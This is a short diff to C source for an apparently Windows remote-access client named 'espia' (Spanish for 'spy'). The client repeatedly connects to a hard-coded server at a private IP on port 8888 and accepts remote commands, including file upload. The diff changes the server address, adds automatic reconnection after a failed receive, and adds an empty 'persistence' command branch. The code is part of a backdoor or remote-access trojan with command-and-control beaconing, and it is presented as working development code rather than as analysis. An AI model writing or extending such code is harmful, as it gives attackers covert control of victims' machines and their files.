@@ -22,7 +22,7 @@ int main() {
 
     /* Keep trying to connect to the server */
 	WORD server_status;
-	while ((server_status = espia_connect("172.30.225.91", "8888")) == CONNECTION_FAIL)
+	while ((server_status = espia_connect("172.27.251.12", "8888")) == CONNECTION_FAIL)
 		Sleep(TRY_SERVER);
     /* ------------------------------------ */
 
@@ -37,6 +37,15 @@ int main() {
         memset(cmd_buff, 0, BUFF_SIZE);
         cmd_arg = NULL;
         cmd_size = espia_recv(recv_buff, BUFF_SIZE);
+
+        /* If connection error occured keep trying to connect to the server */
+        if (cmd_size == RECV_FAIL) {
+            WORD server_status;
+            while ((server_status = espia_connect("172.27.251.12", "8888")) == CONNECTION_FAIL)
+                Sleep(TRY_SERVER);
+        }
+        /* ------------------------------------ */
+
         recv_buffw = (PWSTR)recv_buff;
         printf("Recieved: %ls, size: %d\n", recv_buffw, cmd_size);
 
@@ -75,6 +84,8 @@ int main() {
         } else if (wcscmp(cmd_buff, L"upload") == 0) {
             download_file(cmd_arg , espia_recv, espia_send);
             continue;
+        } else if (wcscmp(cmd_buff, L"persistence") == 0) {
+
         } else {
             espia_send(recv_buffw, cmd_size);
         }
